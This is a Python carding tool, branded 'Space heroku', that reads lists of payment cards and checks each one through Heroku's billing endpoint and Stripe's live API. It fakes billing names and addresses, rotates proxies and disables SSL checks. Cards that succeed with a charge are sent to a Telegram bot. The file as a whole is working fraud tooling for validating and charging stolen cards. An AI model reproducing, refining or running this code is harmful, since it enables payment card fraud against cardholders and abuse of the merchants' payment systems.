import os
import sys
import time
import requests
import random
import telebot
import random

# ANSI color codes
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

# Global variables
use_proxy = False
proxies = []
bot_token = None
user_id = None
import random
cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
addresses = ["Broadway, 1350", "Hollywood Blvd, 450", "Michigan Ave, 1234", "Main St, 230", "Sunset Blvd, 900", "Chestnut St, 550", "Travis St, 280", "Market St, 700", "Elm St, 450", "Almaden Blvd, 600"]
postal_codes = ["10001", "90028", "60616", "77001", "85001", "19103", "78205", "92101", "75201", "95110"]

# Randomly choose values from each list
random_city = random.choice(cities)
random_state = states[cities.index(random_city)]  # Match state to the chosen city
random_address = random.choice(addresses)
random_postal_code = postal_codes[cities.index(random_city)]  
# Define post_data using random values
# Define the full_names list
full_names = [
    "Mohamed Khaled", 
    "Fatima Hassan", 
    "Omar Youssef", 
    "Amina Rania", 
    "Zainab Tarek", 
    "Layla Hussein", 
    "Khaled Mona", 
    "Nour Nabil", 
    "Tamer Aisha", 
    "Yara Samir", 
    "Sarah Lina", 
    "Kareem Dina", 
    "Mustafa Hala", 
    "Maha Majid", 
    "Rami Amal", 
    "Ali Rania", 
    "Khalid Nadia", 
    "Ziad Hannah", 
    "Hassan Yasmin", 
    "Safia Rasha"
]

# Randomly choose a name
random_name = random.choice(full_names)

	    
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def loading_animation():
    animation = ["▖", "▘", "▝", "▗"]
    for _ in range(3):  # 3 seconds, 4 frames per second
        for frame in animation:
            sys.stdout.write(f"\rLoading {frame}")
            sys.stdout.flush()
            time.sleep(0.2)
    print("\nLoading complete!")

def print_ascii_art():
    ascii_art = f"""{YELLOW}
███████╗██████╗  █████╗  ██████╗███████╗
██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝
███████╗██████╔╝███████║██║     █████╗  
╚════██║██╔═══╝ ██╔══██║██║     ██╔══╝  
███████║██║     ██║  ██║╚██████╗███████╗
╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝

- - - - - - - - - - - - - - - - 
 Gear Name - Space heroku - X 
 - - - - - - - - - - - - - - 
 Type - Cc checker + Autohitter                
 Developer xunez.t.me
 Sk Health Of Heroku.com : INFINITY AND HQ 
 Chanel : b3charge.t.me
{RESET}"""
    print(ascii_art)

def print_menu():
    print(f"{GREEN}[+] Start Card CHK Herokux [1]{RESET}")
    print(f"{GREEN}[+] Toggle Proxy [2]{RESET}")
    print(f"{GREEN}[+] Set Telegram Bot [3]{RESET}")
    print(f"\n{GREEN}Please select Any Option: {RESET}", end="")


def toggle_proxy():
    global use_proxy, proxies
    if not use_proxy:
        file_name = input("Enter the proxy file name: ")
        try:
            with open(file_name, 'r') as file:
                proxies = [line.strip() for line in file if line.strip()]
            use_proxy = True
            print("I will Use Proxy now !!")
        except FileNotFoundError:
            print(f"File '{file_name}' not found in the current directory.")
            return
    else:
        use_proxy = False
        proxies = []
        print("I will not use proxy !")
    time.sleep(3)

def set_telegram_bot():
    global bot_token, user_id
    bot_token = input("Please enter your Telegram Bot Token: ")
    user_id = input("Please enter your User ID: ")
    print("Success! I will send Good Cards to the bot.")
    time.sleep(3)

def send_to_telegram(message):
    if bot_token and user_id:
        bot = telebot.TeleBot(bot_token)
        try:
            bot.send_message(user_id, message)
        except Exception as e:
            print(f"Failed to send message to Telegram: {str(e)}")

import warnings
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress only the InsecureRequestWarning from urllib3
warnings.simplefilter('ignore', InsecureRequestWarning)

def parse_proxy(proxy):
    parts = proxy.split(':')
    if len(parts) == 4:
        domain, port, username, password = parts
        return {
            'http': f'http://{username}:{password}@{domain}:{port}',
            'https': f'http://{username}:{password}@{domain}:{port}'  # Use HTTP for HTTPS requests
        }
    else:
        print(f"Invalid proxy format: {proxy}")
        return None

def check_card(card_details, heroku_auth_key):
    try:
        cc, month, year, cvc = card_details.split('|')

        print(f"Processing card: {cc} with expiry {month}/{year}...")

        # Fetch Heroku token
        heroku_token_url = 'https://api.heroku.com/account/payment-method/client-token'
        heroku_headers = {
            'Authorization': f'Bearer {heroku_auth_key}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36',
            'Accept': 'application/vnd.heroku+json; version=3',
            'Origin': 'https://dashboard.heroku.com',
            'Referer': 'https://dashboard.heroku.com/'
        }

        heroku_token_response = requests.post(heroku_token_url, headers=heroku_headers)
        
        # Debug: Print Heroku response
        print(f"Heroku Status: {heroku_token_response.status_code}")
        
        # Check if response is valid JSON
        try:
            heroku_token_data = heroku_token_response.json()
            print(f"Heroku Response: {heroku_token_data}")
        except Exception as json_err:
            print(f"JSON parse error: {json_err}")
            print(f"Raw response: {heroku_token_response.text[:500]}")
            return f"{RED}Invalid Heroku response (Status: {heroku_token_response.status_code}){RESET}"
        
        if heroku_token_data is None:
            return f"{RED}Empty Heroku response{RESET}"

        token = heroku_token_data.get('token')
        if not token:
            error_msg = heroku_token_data.get('message', 'Unknown error')
            return f"{RED}Failed to retrieve Heroku token: {error_msg}{RESET}"

        token_first_part = token.split('_secret_')[0]

        # Prepare data for Stripe API
        post_data = {
            'type': 'card',
            'billing_details[name]':  random_name,
            'billing_details[address][city]': random_city,
            'billing_details[address][country]': 'US',
            'billing_details[address][line1]': random_address,
            'billing_details[address][postal_code]': random_postal_code,
            'billing_details[address][state]': random_state,
            'card[number]': cc,
            'card[cvc]': cvc,
            'card[exp_month]': month,
            'card[exp_year]': year,
            'guid': 'd4b8e68c-52d2-492c-b9ba-89ba2fc3fa17810383',
            'muid': 'c19d3aeb-53ff-46fb-afe6-6ade2aa2f611668716',
            'sid': '7783c03d-2e69-4d39-b77f-23fd8921d1b4367c72',
            'payment_user_agent': 'stripe.js/0b2916fc28; stripe-js-v3/0b2916fc28; split-card-element',
            'referrer': 'https://dashboard.heroku.com',
            'key': 'pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn'
        }

        # First Stripe API call
        stripe_headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
            'Referer': 'https://dashboard.heroku.com',
            'Origin': 'https://dashboard.heroku.com'
        }

        first_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=post_data)
        
        try:
            first_response_data = first_response.json()
        except:
            return f"{RED}Invalid Stripe response{RESET}"
        
        if first_response_data is None:
            return f"{RED}Empty Stripe response{RESET}"

        # Check for Stripe error in first response
        if 'error' in first_response_data:
            error_obj = first_response_data.get('error') or {}
            error_msg = error_obj.get('message', 'Unknown error')
            return f"{RED}{error_msg}{RESET}"

        payment_method_id = first_response_data.get('id')
        if payment_method_id:
            # Second Stripe API call
            second_post_data = {
                'payment_method': payment_method_id,
                'expected_payment_method_type': 'card',
                'use_stripe_sdk': 'true',
                'key': 'pk_live_51KlgQ9Lzb5a9EJ3IaC3yPd1x6i9e6YW9O8d5PzmgPw9IDHixpwQcoNWcklSLhqeHri28drHwRSNlf6g22ZdSBBff002VQu6YLn',
                'client_secret': token
            }

            # Use proxy if enabled
            proxy_dict = None
            if use_proxy and proxies:
                proxy = random.choice(proxies)
                proxy_dict = parse_proxy(proxy)
                if not proxy_dict:
                    print(f"Skipping invalid proxy: {proxy}")
                else:
                    print(f"Using proxy: {proxy}")

            try:
                second_response = requests.post(
                    f'https://api.stripe.com/v1/payment_intents/{token_first_part}/confirm',
                    headers=stripe_headers,
                    data=second_post_data,
                    proxies=proxy_dict,
                    verify=False  # Disable SSL verification when using a proxy
                )
            except requests.exceptions.RequestException as e:
                print(f"Request failed: {str(e)}")
                return f"{RED}Request failed: {str(e)}{RESET}"


            response_code = second_response.status_code
            
            try:
                response_body = second_response.json()
            except:
                return f"{RED}Invalid response from Stripe confirm{RESET}"
            
            if response_body is None:
                return f"{RED}Empty response from Stripe confirm{RESET}"

            if response_code == 402:
                error_obj = response_body.get('error') or {}
                decline_code = error_obj.get('decline_code')
                error_message = error_obj.get('message', 'Unknown error')
                if decline_code == 'generic_decline':
                    return f"{RED}The card has been declined (Generic){RESET}"
                elif decline_code == 'expired_card':
                    return f"{RED}The card has expired{RESET}"
                elif decline_code == 'incorrect_cvc':
                    return f"{YELLOW}The CVC code is incorrect CCN{RESET}"
                elif decline_code == 'incorrect_number':
                    return f"{RED}The card number is incorrect{RESET}"
                elif decline_code == 'insufficient_funds':
                    return f"{YELLOW}There are not enough funds on the card{RESET}"
                elif decline_code == 'invalid_expiry_date':
                    return f"{RED}The expiration date is incorrect{RESET}"
                elif decline_code == 'restricted_card':
                    return f"{YELLOW}The card cannot be used for this transaction{RESET}"
                elif decline_code == 'lost_card':
                    return f"{BLUE}The card has been reported lost{RESET}"
                elif decline_code == 'stolen_card':
                    return f"{BLUE}The card has been reported stolen{RESET}"
                elif decline_code == 'pickup_card':
                    return f"{BLUE}The card needs to be confiscated by the merchant{RESET}"
                elif decline_code == 'authentication_required':
                    return f"{YELLOW}The card requires authentication, like 3D Secure{RESET}"
                elif decline_code == 'do_not_honor':
                    return f"{RED}The issuing bank does not approve{RESET}"
                else:
                    return f"{RED}Decline: {decline_code or error_message}{RESET}"
            elif response_code == 200:
                status = response_body.get('status')
                if status == 'succeeded':
                    result = f"{YELLOW}Charged 1$ CVV Added Card !!{RESET}"
                    send_to_telegram(f"{card_details} - Charged 1$ CVV Added Card !!")
                    return result
                elif status == 'requires_action':
                    # Debug: Print full response to see where decline info is
                    print(f"Full response: {response_body}", flush=True)
                    
                    # Check for decline reason in last_payment_error
                    last_error = response_body.get('last_payment_error') or {}
                    decline_code = last_error.get('decline_code')
                    error_message = last_error.get('message', '')
                    
                    if decline_code == 'insufficient_funds':
                        return f"{YELLOW}Insufficient Funds{RESET}"
                    elif decline_code == 'generic_decline':
                        return f"{RED}The card has been declined (Generic){RESET}"
                    elif decline_code == 'incorrect_cvc':
                        return f"{YELLOW}The CVC code is incorrect CCN{RESET}"
                    elif decline_code == 'do_not_honor':
                        return f"{RED}The issuing bank does not approve{RESET}"
                    elif decline_code == 'stolen_card':
                        return f"{BLUE}The card has been reported stolen{RESET}"
                    elif decline_code == 'lost_card':
                        return f"{BLUE}The card has been reported lost{RESET}"
                    elif decline_code == 'expired_card':
                        return f"{RED}The card has expired{RESET}"
                    elif decline_code == 'restricted_card':
                        return f"{YELLOW}The card cannot be used for this transaction{RESET}"
                    elif decline_code:
                        return f"{YELLOW}Decline: {decline_code}{RESET}"
                    else:
                        return f"{RED}3D Secure Required{RESET}"
                else:
                    return f"{YELLOW}{status}{RESET}"
            else:
                return f"{RED}Unknown response: {response_code}{RESET}"
        else:
            return f"{RED}Failed to retrieve payment method ID{RESET}"

    except requests.exceptions.ProxyError as e:
        return f"{RED}Proxy error: {str(e)}{RESET}"
    except requests.exceptions.RequestException as e:
        return f"{RED}Request failed: {str(e)}{RESET}"
    except Exception as e:
        import traceback
        traceback.print_exc()
        return f"{RED}Card check failed: {str(e)}{RESET}"

def start_card_check():
    heroku_auth_key = input("Please enter your Heroku auth token: ")
    file_name = input("Please enter your txt file name which contains cards: ")
    try:
        with open(file_name, 'r') as file:
            cards = file.readlines()
        
        for card in cards:
            card = card.strip()
            response = check_card(card, heroku_auth_key)
            print(f"{card} {response}")
    except FileNotFoundError:
        print(f"File '{file_name}' not found in the current directory.")

def main():
    loading_animation()
    while True:
        clear_screen()
        print_ascii_art()
        print_menu()
        
        choice = input()
        
        if choice == '1':
            start_card_check()
        elif choice == '2':
            toggle_proxy()
        elif choice == '3':
            set_telegram_bot()
        else:
            print("Invalid option. Please try again.")
        
        input("Press Enter to continue...")

if __name__ == '__main__':
    main()
